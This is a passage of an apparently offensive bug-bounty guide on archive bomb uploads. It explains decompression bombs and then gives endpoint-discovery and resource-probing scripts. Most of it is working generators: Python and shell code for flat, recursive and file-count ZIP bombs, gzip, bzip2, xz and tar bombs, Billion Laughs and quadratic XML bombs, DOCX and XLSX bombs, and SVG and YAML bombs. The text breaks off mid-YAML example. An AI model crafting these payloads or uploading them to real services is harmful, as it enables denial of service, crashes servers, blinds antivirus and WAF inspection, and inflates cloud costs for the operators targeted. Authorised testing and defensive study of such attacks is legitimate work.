---
title: Archive Bomb Upload
description: Archive Bomb Upload — Denial of Service & Resource Exhaustion via Malicious Archive Files
navigation:
  icon: i-lucide-bomb
  title: Archive Bomb Upload
---

## Archive Bomb Upload

::note
An **Archive Bomb** (also called a Zip Bomb, Decompression Bomb, or Compression Bomb) is a maliciously crafted archive file designed to consume extreme amounts of disk space, memory, or CPU when extracted or analyzed. A tiny file — sometimes as small as **42 KB** — can expand to **4.5 petabytes** when decompressed. When a web application accepts archive uploads and processes them server-side (extraction, scanning, thumbnail generation, antivirus analysis), an archive bomb can crash the server, exhaust disk space, fill memory, pin CPUs at 100%, and trigger cascading failures across the infrastructure. In bug bounty, archive bombs demonstrate **Denial of Service (DoS)**, **resource exhaustion**, and **defense bypass** impacts.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="How Archive Bombs Work"}
  Archive bombs exploit the fundamental nature of compression: highly repetitive data compresses extremely well. A file containing billions of identical bytes (`0x00`) compresses to almost nothing, but decompressing it regenerates the full size.

  **Three main decompression bomb strategies:**

  1. **Recursive (Nested) Bombs:** A ZIP file contains another ZIP, which contains another ZIP — dozens of layers deep. Each layer expands, creating exponential growth.

  2. **Non-Recursive (Flat) Bombs:** A single ZIP contains multiple files that reference the same compressed data block through overlapping local file headers. No nesting required — a single layer creates petabytes.

  3. **Quine Bombs:** A ZIP file that contains copies of itself. When extracted recursively, it reproduces infinitely.

  **Expansion ratios:**
  | Bomb | Compressed Size | Expanded Size | Ratio |
  | ---- | --------------- | ------------- | ----- |
  | 42.zip (classic) | 42 KB | 4.5 PB | 109 billion:1 |
  | Flat zip bomb | 46 KB | 4.5 PB | 98 billion:1 |
  | zbsm.zip | 42 bytes | 5.5 GB | 130 million:1 |
  | Non-recursive 10MB | 10 MB | 281 TB | 28 billion:1 |
  | XML Bomb (Billion Laughs) | ~1 KB | ~3 GB RAM | 3 million:1 |
  | GZIP bomb | 10 bytes | 10 GB | 1 billion:1 |
  :::

  :::accordion-item{icon="i-lucide-layers" label="Attack Surface — Where Bombs Detonate"}
  | Processing Stage | What Happens | Bomb Impact |
  | ---------------- | ------------ | ----------- |
  | **Archive extraction** | Server unzips/untars uploaded files | Disk exhaustion, OOM kill |
  | **Antivirus scanning** | AV engine decompresses to scan contents | AV crash, scan bypass |
  | **File preview/thumbnail** | Image extraction from archives | Memory exhaustion |
  | **Backup/restore** | Application processes backup archives | Infrastructure DoS |
  | **Import/migration** | Data import from ZIP/TAR files | Database/disk crash |
  | **Email attachment** | Mail server processes archive attachments | Mail server DoS |
  | **CI/CD pipeline** | Build system processes source archives | Pipeline crash |
  | **Document processing** | DOCX/XLSX (ZIP-based) parsing | Parser crash |
  | **Container registries** | Docker layer processing | Registry DoS |
  | **CDN/WAF** | Content inspection of uploads | WAF bypass, CDN crash |
  | **Log aggregation** | Compressed log upload processing | Log system crash |
  :::

  :::accordion-item{icon="i-lucide-target" label="Impact Scenarios"}
  | Impact | Description | Severity |
  | ------ | ----------- | -------- |
  | **Server Crash** | OOM killer terminates web server process | High |
  | **Disk Exhaustion** | Fills entire disk partition → all services fail | High |
  | **CPU Exhaustion** | 100% CPU during decompression → unresponsive server | High |
  | **AV Bypass** | Antivirus crashes before scanning malicious payload | Critical |
  | **Cascading Failure** | Database, cache, logging all fail from resource starvation | High |
  | **Cloud Cost Attack** | Auto-scaling triggers from CPU/memory spike → massive bill | Medium |
  | **WAF Bypass** | WAF crashes analyzing bomb → subsequent attacks pass through | Critical |
  | **Data Loss** | Disk full prevents database writes → corruption | High |
  | **Service Degradation** | Shared hosting affects all tenants | High |
  | **Monitoring Blind Spot** | Monitoring system overwhelmed → attacks go undetected | Medium |
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Archive Bomb Types"}
  - **ZIP Bomb** — Classic `.zip` decompression bomb (recursive or flat)
  - **TAR Bomb** — Tar archive with massive extracted size
  - **GZIP Bomb** — Single `.gz` file that decompresses to enormous size
  - **BZIP2 Bomb** — `.bz2` with extreme compression ratio
  - **XZ Bomb** — `.xz` format with highest compression ratio
  - **ZSTD Bomb** — Zstandard format bomb
  - **7z Bomb** — 7-Zip format decompression bomb
  - **RAR Bomb** — RAR archive bomb
  - **XML Bomb (Billion Laughs)** — Entity expansion in XML/DOCX/XLSX
  - **JSON Bomb** — Deeply nested JSON structures
  - **YAML Bomb** — Alias-based expansion in YAML
  - **Image Bomb (Pixel Flood)** — Image with extreme dimensions (e.g., 1000000x1000000 px)
  - **PDF Bomb** — PDF with recursive object references
  - **SVG Bomb** — SVG with entity expansion
  - **OOXML Bomb** — Malicious DOCX/XLSX/PPTX (ZIP + XML bomb)
  :::
::

---

## Reconnaissance & Target Analysis

### Identifying Vulnerable Endpoints

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Endpoint Discovery"}
  ```bash
  # ── Find endpoints that accept archive uploads ──

  # Crawl for upload/import endpoints
  katana -u https://target.com -d 5 -jc -kf -o crawl.txt
  grep -iE "upload|import|extract|restore|backup|migrate|decompress|unzip|untar|archive|bulk|batch|ingest" crawl.txt | sort -u > archive_endpoints.txt

  # Historical URLs
  echo "target.com" | gau --threads 10 | grep -iE "upload|import|extract|restore|backup|archive|zip|tar" | sort -u >> archive_endpoints.txt

  # Ffuf endpoint discovery
  ffuf -u https://target.com/FUZZ -w <(cat << 'EOF'
  upload
  api/upload
  api/v1/upload
  api/v2/upload
  api/import
  api/v1/import
  api/files/upload
  api/bulk-import
  api/data/import
  api/archive/upload
  admin/upload
  admin/restore
  admin/backup/upload
  admin/import
  settings/import
  config/restore
  migration/import
  theme/upload
  plugin/install
  extension/upload
  backup/restore
  data/import
  batch/upload
  api/extract
  api/decompress
  file/process
  document/upload
  report/import
  template/upload
  media/bulk-upload
  EOF
  ) -mc 200,301,302,401,403,405

  # Check for file processing APIs
  for endpoint in $(cat archive_endpoints.txt); do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$endpoint" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[${STATUS}] ${endpoint}"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Processing Detection"}
  ```bash
  # ── Determine HOW the server processes archives ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Create a small legitimate ZIP
  mkdir -p /tmp/legit_zip
  echo "test content" > /tmp/legit_zip/test.txt
  cd /tmp/legit_zip && zip ../legit.zip test.txt && cd -

  # Upload and analyze response
  RESP=$(curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/legit.zip;type=application/zip" \
    -H "Cookie: $COOKIE")

  echo "[*] Upload response:"
  echo "$RESP" | python3 -m json.tool 2>/dev/null || echo "$RESP"

  # Look for indicators of server-side extraction:
  echo "$RESP" | grep -iE "extract|decompress|unzip|process|scan|files found|entries|contents"

  # ── Test with different archive formats ──
  echo "test" > /tmp/test.txt

  # TAR
  tar czf /tmp/test.tar.gz -C /tmp test.txt
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.tar.gz;type=application/gzip" -H "Cookie: $COOKIE")
  echo "[${STATUS}] .tar.gz"

  # 7z
  7z a /tmp/test.7z /tmp/test.txt 2>/dev/null
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.7z;type=application/x-7z-compressed" -H "Cookie: $COOKIE")
  echo "[${STATUS}] .7z"

  # RAR (if rar command available)
  rar a /tmp/test.rar /tmp/test.txt 2>/dev/null
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.rar;type=application/x-rar-compressed" -H "Cookie: $COOKIE")
  echo "[${STATUS}] .rar"

  # BZ2
  bzip2 -k /tmp/test.txt 2>/dev/null && mv /tmp/test.txt.bz2 /tmp/test.bz2
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.bz2;type=application/x-bzip2" -H "Cookie: $COOKIE")
  echo "[${STATUS}] .bz2"

  # XZ
  xz -k /tmp/test.txt 2>/dev/null && mv /tmp/test.txt.xz /tmp/test.xz
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.xz;type=application/x-xz" -H "Cookie: $COOKIE")
  echo "[${STATUS}] .xz"

  rm -rf /tmp/legit_zip /tmp/legit.zip /tmp/test.txt /tmp/test.*
  ```
  :::

  :::tabs-item{icon="i-lucide-microscope" label="Resource Limit Detection"}
  ```bash
  # ── Probe server resource limits before crafting bombs ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Upload Size Limits ═══"

  # Create files of increasing size and test
  for size in 1M 5M 10M 25M 50M 100M 200M 500M; do
      dd if=/dev/zero of=/tmp/size_test.bin bs=1 count=0 seek=$size 2>/dev/null
      zip -j /tmp/size_test.zip /tmp/size_test.bin 2>/dev/null

      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 30 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/size_test.zip;type=application/zip" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      ACTUAL_SIZE=$(wc -c < /tmp/size_test.zip 2>/dev/null)
      echo "[${STATUS}] ZIP with ${size} content (compressed: ${ACTUAL_SIZE} bytes)"

      [ "$STATUS" = "413" ] && echo "    → Max upload size reached" && break
      [ "$STATUS" = "000" ] && echo "    → Connection timeout/reset" && break
  done

  echo ""
  echo "═══ File Count Limits ═══"

  # Create ZIPs with increasing file counts
  for count in 100 1000 5000 10000 50000; do
      mkdir -p /tmp/count_test
      for i in $(seq 1 $count); do
          echo "x" > "/tmp/count_test/file_${i}.txt"
      done 2>/dev/null
      cd /tmp/count_test && zip -r /tmp/count_test.zip . 2>/dev/null && cd -

      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 60 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/count_test.zip;type=application/zip" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      echo "[${STATUS}] ZIP with ${count} files"
      rm -rf /tmp/count_test /tmp/count_test.zip
      [ "$STATUS" = "413" ] || [ "$STATUS" = "000" ] && break
  done

  echo ""
  echo "═══ Processing Time Limits ═══"

  # Time how long the server takes to process archives
  echo "test" > /tmp/time_test.txt
  zip /tmp/time_test.zip /tmp/time_test.txt 2>/dev/null

  START=$(date +%s%N)
  curl -s -o /dev/null -w "%{http_code}" --max-time 120 \
    -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/time_test.zip;type=application/zip" \
    -H "Cookie: $COOKIE"
  END=$(date +%s%N)
  ELAPSED=$(( (END - START) / 1000000 ))
  echo "Processing time: ${ELAPSED}ms"

  rm -f /tmp/size_test.* /tmp/time_test.* /tmp/count_test.*
  ```
  :::
::

---

## Archive Bomb Crafting

::warning
Archive bombs should be used **responsibly** in bug bounty. Start with **small, controlled bombs** to demonstrate the vulnerability without causing lasting damage. Always coordinate with the program and use the minimum payload needed to prove impact.
::

### ZIP Bombs

::tabs
  :::tabs-item{icon="i-lucide-file-archive" label="Non-Recursive Flat Bomb (Recommended)"}
  ```python [flat_zip_bomb.py]
  #!/usr/bin/env python3
  """
  Non-Recursive (Flat) ZIP Bomb Generator
  Creates a single-layer ZIP that expands massively.
  
  The technique: Create a ZIP with many entries that all reference
  the SAME compressed data block through overlapping local file headers.
  This is more dangerous than recursive bombs because:
  - No nested extraction needed
  - Many decompressors handle it in one pass
  - Bypasses "max recursion depth" protections
  
  Reference: https://www.bamsoftware.com/hacks/zipbomb/
  """
  import zipfile
  import struct
  import zlib
  import os
  import sys

  def create_controlled_zip_bomb(output_path, expanded_size_mb=100, num_files=10):
      """
      Create a controlled ZIP bomb for PoC purposes.
      
      Args:
          output_path: Output ZIP file path
          expanded_size_mb: Target expanded size in MB
          num_files: Number of files inside the ZIP
      """
      file_size = (expanded_size_mb * 1024 * 1024) // num_files

      with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
          for i in range(num_files):
              # Highly compressible data: all zeros
              data = b'\x00' * file_size
              zf.writestr(f'bomb_{i:04d}.bin', data)

      compressed_size = os.path.getsize(output_path)
      ratio = (expanded_size_mb * 1024 * 1024) / compressed_size

      print(f"[+] Created: {output_path}")
      print(f"    Compressed: {compressed_size:,} bytes ({compressed_size/1024:.1f} KB)")
      print(f"    Expanded:   {expanded_size_mb} MB ({expanded_size_mb*1024*1024:,} bytes)")
      print(f"    Ratio:      {ratio:,.0f}:1")
      print(f"    Files:      {num_files}")

      return output_path

  def create_graduated_bombs(output_dir="zip_bombs"):
      """Create bombs of increasing severity for graduated testing"""
      os.makedirs(output_dir, exist_ok=True)

      levels = [
          ("level1_safe.zip",      10,    5,   "Safe PoC — 10 MB expanded"),
          ("level2_moderate.zip",  100,   10,  "Moderate — 100 MB expanded"),
          ("level3_heavy.zip",     1000,  20,  "Heavy — 1 GB expanded"),
          ("level4_severe.zip",    5000,  50,  "Severe — 5 GB expanded"),
          ("level5_extreme.zip",   10000, 100, "Extreme — 10 GB expanded"),
      ]

      print("═══ Graduated ZIP Bomb Generation ═══\n")
      for filename, size_mb, num_files, description in levels:
          print(f"--- {description} ---")
          create_controlled_zip_bomb(
              os.path.join(output_dir, filename),
              expanded_size_mb=size_mb,
              num_files=num_files
          )
          print()

  def create_many_files_bomb(output_path, num_files=100000, file_size=1024):
      """
      Bomb via file count — overwhelm filesystem inode allocation.
      Doesn't need large expansion, just millions of small files.
      """
      with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
          data = b'\x00' * file_size
          for i in range(num_files):
              # Deep directory structure
              depth = i % 50
              path = '/'.join([f'd{j}' for j in range(depth)]) + f'/file_{i}.txt'
              zf.writestr(path, data)

      size = os.path.getsize(output_path)
      print(f"[+] Created: {output_path}")
      print(f"    Compressed: {size:,} bytes")
      print(f"    Files: {num_files:,}")
      print(f"    Total expanded: {num_files * file_size / 1024 / 1024:.0f} MB")

  if __name__ == "__main__":
      # Generate graduated test bombs
      create_graduated_bombs()

      # Generate file count bomb
      print("\n--- File Count Bomb ---")
      create_many_files_bomb("zip_bombs/filecount_bomb.zip", num_files=50000)
  ```
  :::

  :::tabs-item{icon="i-lucide-file-archive" label="Recursive (Nested) Bomb"}
  ```python [recursive_zip_bomb.py]
  #!/usr/bin/env python3
  """
  Recursive ZIP Bomb Generator
  Creates nested ZIP files — each layer contains multiple copies
  of the inner ZIP, causing exponential expansion.
  
  Layer 1: 1 file (1 GB compressed null bytes)
  Layer 2: 10 copies of layer 1 → 10 GB
  Layer 3: 10 copies of layer 2 → 100 GB
  Layer 4: 10 copies of layer 3 → 1 TB
  Layer 5: 10 copies of layer 4 → 10 TB
  ...and so on
  """
  import zipfile
  import os
  import shutil
  import io

  def create_recursive_bomb(output_path, layers=5, copies_per_layer=10,
                             base_size_mb=10):
      """
      Create a recursive ZIP bomb.
      
      Final size = base_size_mb * copies_per_layer^layers
      Default: 10 MB * 10^5 = 1 TB
      """

      print(f"[*] Creating recursive bomb:")
      print(f"    Layers: {layers}")
      print(f"    Copies per layer: {copies_per_layer}")
      print(f"    Base size: {base_size_mb} MB")

      theoretical_size = base_size_mb * (copies_per_layer ** layers)
      units = ['MB', 'GB', 'TB', 'PB', 'EB']
      size_val = theoretical_size
      unit_idx = 0
      while size_val >= 1024 and unit_idx < len(units) - 1:
          size_val /= 1024
          unit_idx += 1
      print(f"    Theoretical expanded: {size_val:.1f} {units[unit_idx]}")

      # Create base layer: highly compressible data
      base_data = b'\x00' * (base_size_mb * 1024 * 1024)

      # Build from inside out
      current_layer = io.BytesIO()
      with zipfile.ZipFile(current_layer, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
          zf.writestr('data.bin', base_data)
      current_data = current_layer.getvalue()
      print(f"    Layer 0 (base): {len(current_data):,} bytes")

      for layer in range(1, layers + 1):
          next_layer = io.BytesIO()
          with zipfile.ZipFile(next_layer, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
              for i in range(copies_per_layer):
                  zf.writestr(f'layer{layer}_{i:03d}.zip', current_data)
          current_data = next_layer.getvalue()
          print(f"    Layer {layer}: {len(current_data):,} bytes")

      # Write final bomb
      with open(output_path, 'wb') as f:
          f.write(current_data)

      print(f"\n[+] Created: {output_path}")
      print(f"    Final size: {os.path.getsize(output_path):,} bytes")

  if __name__ == "__main__":
      # Small PoC bomb (10 MB * 10^3 = 10 GB)
      create_recursive_bomb("recursive_bomb_poc.zip", layers=3, copies_per_layer=10, base_size_mb=10)

      # Medium bomb (10 MB * 10^4 = 100 GB)
      create_recursive_bomb("recursive_bomb_medium.zip", layers=4, copies_per_layer=10, base_size_mb=10)

      # Classic 42.zip equivalent (layers=5, 10 copies, large base)
      # create_recursive_bomb("recursive_bomb_extreme.zip", layers=5, copies_per_layer=10, base_size_mb=100)
  ```
  :::

  :::tabs-item{icon="i-lucide-file-archive" label="CLI Quick Crafting"}
  ```bash
  # ══════════════════════════════════════
  # Quick ZIP bomb creation from command line
  # ══════════════════════════════════════

  # ── Method 1: dd + zip (simplest) ──
  # Create 1 GB of zeros, compress to tiny ZIP
  dd if=/dev/zero of=/tmp/bomb_data.bin bs=1M count=1024 2>/dev/null
  zip -9 -j zip_bomb_1gb.zip /tmp/bomb_data.bin
  ls -lh zip_bomb_1gb.zip
  rm /tmp/bomb_data.bin

  # ── Method 2: Multiple files of zeros ──
  mkdir -p /tmp/bomb_dir
  for i in $(seq 1 10); do
      dd if=/dev/zero of="/tmp/bomb_dir/file_${i}.bin" bs=1M count=100 2>/dev/null
  done
  cd /tmp/bomb_dir && zip -9 -r /tmp/zip_bomb_1gb_multi.zip . && cd -
  ls -lh /tmp/zip_bomb_1gb_multi.zip
  rm -rf /tmp/bomb_dir

  # ── Method 3: Python one-liner ──
  python3 -c "
  import zipfile
  with zipfile.ZipFile('bomb_100mb.zip','w',zipfile.ZIP_DEFLATED,compresslevel=9) as z:
      z.writestr('bomb.bin', b'\x00' * (100*1024*1024))
  import os; print(f'Size: {os.path.getsize(\"bomb_100mb.zip\"):,} bytes')
  "

  # ── Method 4: Recursive bomb via bash ──
  # Create base layer
  dd if=/dev/zero bs=1M count=100 2>/dev/null | zip -9 - > /tmp/layer0.zip
  # Nest it
  for layer in 1 2 3; do
      mkdir -p /tmp/nest
      for i in $(seq 1 10); do
          cp /tmp/layer$((layer-1)).zip "/tmp/nest/copy_${i}.zip"
      done
      cd /tmp/nest && zip -9 -r "/tmp/layer${layer}.zip" . && cd -
      rm -rf /tmp/nest
      echo "Layer ${layer}: $(ls -lh /tmp/layer${layer}.zip | awk '{print $5}')"
  done
  cp /tmp/layer3.zip recursive_bomb.zip
  rm /tmp/layer*.zip

  # ── Method 5: GZIP bomb ──
  dd if=/dev/zero bs=1M count=1024 2>/dev/null | gzip -9 > gzip_bomb_1gb.gz
  ls -lh gzip_bomb_1gb.gz
  # ~1 MB compressed → 1 GB expanded

  # ── Method 6: BZIP2 bomb (better compression) ──
  dd if=/dev/zero bs=1M count=1024 2>/dev/null | bzip2 -9 > bzip2_bomb_1gb.bz2
  ls -lh bzip2_bomb_1gb.bz2

  # ── Method 7: XZ bomb (best compression ratio) ──
  dd if=/dev/zero bs=1M count=1024 2>/dev/null | xz -9e > xz_bomb_1gb.xz
  ls -lh xz_bomb_1gb.xz
  # XZ achieves the highest compression ratio

  # ── Method 8: TAR bomb ──
  dd if=/dev/zero of=/tmp/tarbomb.bin bs=1M count=500 2>/dev/null
  tar czf tar_bomb_500mb.tar.gz -C /tmp tarbomb.bin
  ls -lh tar_bomb_500mb.tar.gz
  rm /tmp/tarbomb.bin
  ```
  :::
::

### XML Bombs (Billion Laughs)

::tabs
  :::tabs-item{icon="i-lucide-code" label="Standard XML Bomb"}
  ```bash
  # ══════════════════════════════════════
  # XML Bomb — Billion Laughs Attack
  # Entity expansion causes exponential memory consumption
  # ~1 KB XML → ~3 GB in memory
  # ══════════════════════════════════════

  # ── Classic Billion Laughs ──
  cat > xml_bomb.xml << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  ]>
  <lolz>&lol9;</lolz>
  EOF
  # Entity count: 10^9 = 1 billion "lol" strings = ~3 GB memory

  # ── Quadratic Blowup (alternative) ──
  python3 -c "
  # Doesn't use entity nesting — bypasses entity depth limits
  entity_size = 50000
  repeat_count = 50000
  xml = '<?xml version=\"1.0\"?>\n'
  xml += '<!DOCTYPE bomb [\n'
  xml += f'  <!ENTITY a \"{\"A\" * entity_size}\">\n'
  xml += ']>\n'
  xml += f'<bomb>{\"&a;\" * repeat_count}</bomb>\n'
  open('xml_quadratic_bomb.xml', 'w').write(xml)
  import os
  print(f'File size: {os.path.getsize(\"xml_quadratic_bomb.xml\"):,} bytes')
  print(f'Expanded size: ~{entity_size * repeat_count / 1024 / 1024:.0f} MB')
  "

  # ── Controlled XML bomb (smaller, safe for PoC) ──
  cat > xml_bomb_poc.xml << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE poc [
    <!ENTITY a "AAAAAAAAAA">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  ]>
  <root>&e;</root>
  EOF
  # 10^5 * 10 = 1 million 'A's = ~1 MB (safe for PoC)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="OOXML Bombs (DOCX/XLSX)"}
  ```python [ooxml_bomb.py]
  #!/usr/bin/env python3
  """
  OOXML (DOCX/XLSX) Bomb Generator
  DOCX and XLSX files are ZIP archives containing XML.
  Inject Billion Laughs XML bomb into the document XML components.
  """
  import zipfile
  import os

  def create_docx_bomb(output_path, depth=7):
      """Create a DOCX with XML bomb in document.xml"""

      # Build entity chain
      entities = '  <!ENTITY lol "lol">\n'
      for i in range(2, depth + 1):
          prev = f"&lol{i-1};" if i > 2 else "&lol;"
          refs = prev * 10
          entities += f'  <!ENTITY lol{i} "{refs}">\n'

      last_entity = f"&lol{depth};" if depth > 1 else "&lol;"

      document_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
  {entities}]>
  <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
      <w:p><w:r><w:t>{last_entity}</w:t></w:r></w:p>
    </w:body>
  </w:document>'''

      with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
          zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  </Types>''')

          zf.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  </Relationships>''')

          zf.writestr('word/_rels/document.xml.rels', '''<?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>''')

          zf.writestr('word/document.xml', document_xml)

      expanded = 3 * (10 ** depth)
      print(f"[+] {output_path} — DOCX bomb (depth={depth}, ~{expanded:,} entities)")

  def create_xlsx_bomb(output_path, depth=7):
      """Create an XLSX with XML bomb in sharedStrings.xml"""

      entities = '  <!ENTITY lol "lol">\n'
      for i in range(2, depth + 1):
          prev = f"&lol{i-1};" if i > 2 else "&lol;"
          entities += f'  <!ENTITY lol{i} "{prev * 10}">\n'

      last = f"&lol{depth};" if depth > 1 else "&lol;"

      shared_strings = f'''<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [{entities}]>
  <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
    <si><t>{last}</t></si>
  </sst>'''

      with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
          zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
    <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
    <Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
  </Types>''')

          zf.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
  </Relationships>''')

          zf.writestr('xl/_rels/workbook.xml.rels', '''<?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
  </Relationships>''')

          zf.writestr('xl/workbook.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>
  </workbook>''')

          zf.writestr('xl/worksheets/sheet1.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData>
  </worksheet>''')

          zf.writestr('xl/sharedStrings.xml', shared_strings)

      print(f"[+] {output_path} — XLSX bomb (depth={depth})")

  # Generate
  create_docx_bomb("docx_bomb_poc.docx", depth=5)    # ~100K entities (safe PoC)
  create_docx_bomb("docx_bomb_medium.docx", depth=7)  # ~10M entities
  create_xlsx_bomb("xlsx_bomb_poc.xlsx", depth=5)
  create_xlsx_bomb("xlsx_bomb_medium.xlsx", depth=7)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SVG / YAML / JSON Bombs"}
  ```bash
  # ══════════════════════════════════════
  # SVG Bomb — Entity expansion in SVG image
  # ══════════════════════════════════════

  cat > svg_bomb.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="10" y="50">&lol7;</text>
  </svg>
  EOF

  # ══════════════════════════════════════
  # YAML Bomb — Alias-based expansion
  # ══════════════════════════════════════

  cat > yaml_bomb.yml << 'EOF'
  a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
